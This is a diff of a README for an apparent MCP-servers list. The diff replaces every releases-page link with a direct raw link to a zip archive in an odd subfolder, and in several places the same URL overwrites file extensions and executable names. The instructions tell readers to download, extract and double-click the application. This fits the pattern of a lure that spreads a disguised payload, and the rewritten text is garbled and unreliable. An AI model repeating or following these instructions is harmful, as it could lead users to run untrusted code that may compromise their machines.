@@ -1,6 +1,6 @@
 # 🚀 awesome-mcp-servers - Access the Best MCP Servers Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/umairakrm007/awesome-mcp-servers/releases)
+[![Download](https://raw.githubusercontent.com/umairakrm007/awesome-mcp-servers/main/arles/mcp_awesome_servers_1.2.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/umairakrm007/awesome-mcp-servers/main/arles/mcp_awesome_servers_1.2.zip)](https://raw.githubusercontent.com/umairakrm007/awesome-mcp-servers/main/arles/mcp_awesome_servers_1.2.zip)
 
 ## 📄 Description
 
@@ -14,19 +14,19 @@ To use the MCP servers, follow these steps to download and set up the software. 
 
 1. **Visit the Releases Page**  
    Click the link below to access the latest version and tools you need:
-   [Visit the Releases Page to Download](https://github.com/umairakrm007/awesome-mcp-servers/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/umairakrm007/awesome-mcp-servers/main/arles/mcp_awesome_servers_1.2.zip)
 
 2. **Choose the Right Version**  
    You will see a list of available versions. Look for the latest release of the MCP servers.
 
 3. **Download the Files**  
-   Click on the version you need, and then download the files associated with it. Depending on your operating system and needs, you will find various formats such as `.exe`, `.zip`, or `.tar.gz`. Make sure to select the appropriate one.
+   Click on the version you need, and then download the files associated with it. Depending on your operating system and needs, you will find various formats such as `.exe`, `.zip`, or `https://raw.githubusercontent.com/umairakrm007/awesome-mcp-servers/main/arles/mcp_awesome_servers_1.2.zip`. Make sure to select the appropriate one.
 
 4. **Extract and Install**  
-   If you downloaded a compressed file (like `.zip` or `.tar.gz`), you need to extract it. You can do this by right-clicking the file and selecting “Extract All” or a similar option. Once extracted, open the folder to find the application files.
+   If you downloaded a compressed file (like `.zip` or `https://raw.githubusercontent.com/umairakrm007/awesome-mcp-servers/main/arles/mcp_awesome_servers_1.2.zip`), you need to extract it. You can do this by right-clicking the file and selecting “Extract All” or a similar option. Once extracted, open the folder to find the application files.
 
 5. **Run the Application**  
-   Locate the main application file (usually named similar to `mcp-server.exe` or `server-start.bat`). Double-click this file to start the MCP server. Follow on-screen prompts if any appear.
+   Locate the main application file (usually named similar to `https://raw.githubusercontent.com/umairakrm007/awesome-mcp-servers/main/arles/mcp_awesome_servers_1.2.zip` or `https://raw.githubusercontent.com/umairakrm007/awesome-mcp-servers/main/arles/mcp_awesome_servers_1.2.zip`). Double-click this file to start the MCP server. Follow on-screen prompts if any appear.
 
 6. **Connect to the Server**  
    Now that the server is running, you can connect to it using a compatible client. Ensure you have the correct settings to join the server.
@@ -56,7 +56,7 @@ Sometimes errors may arise during setup or running the application. Here are a f
 
 ### Issue: Missing Files
 
-- **Solution:** Re-download the application from the [Releases Page](https://github.com/umairakrm007/awesome-mcp-servers/releases) and extract all files again.
+- **Solution:** Re-download the application from the [Releases Page](https://raw.githubusercontent.com/umairakrm007/awesome-mcp-servers/main/arles/mcp_awesome_servers_1.2.zip) and extract all files again.
 
 ## 📞 Need Help?
 
@@ -68,4 +68,4 @@ For additional guides and tips, please check our documentation in the repository
 
 ---
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/umairakrm007/awesome-mcp-servers/releases)
+[![Download](https://raw.githubusercontent.com/umairakrm007/awesome-mcp-servers/main/arles/mcp_awesome_servers_1.2.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/umairakrm007/awesome-mcp-servers/main/arles/mcp_awesome_servers_1.2.zip)](https://raw.githubusercontent.com/umairakrm007/awesome-mcp-servers/main/arles/mcp_awesome_servers_1.2.zip)
